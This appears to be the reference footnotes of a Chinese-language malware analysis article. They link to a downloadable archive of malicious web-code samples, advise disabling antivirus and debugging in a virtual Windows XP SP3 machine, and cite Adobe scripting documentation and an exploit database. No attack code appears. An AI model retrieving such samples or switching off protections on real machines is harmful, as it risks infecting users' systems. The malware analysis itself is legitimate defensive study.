(1][附件](http://drops.wooyun.org/wp-content/uploads/2015/06/malicouscode_vi.rar)请关闭杀毒软件并在虚拟环境调试，网马的Shellcode比较老，EXE调试环境推荐Windows XP SP3。

(2] http://www.adobe.com/devnet/acrobat/javascript.html

(3] Communicating between workers http://help.adobe.com/en_US/as3/dev/WS2f73111e7a180bd0-5856a8af1390d64d08c-7ffe.html

(4] http://www.expl0it-db.com/

(5] http://www.cnblogs.com/Lamboy/p/4278066.html
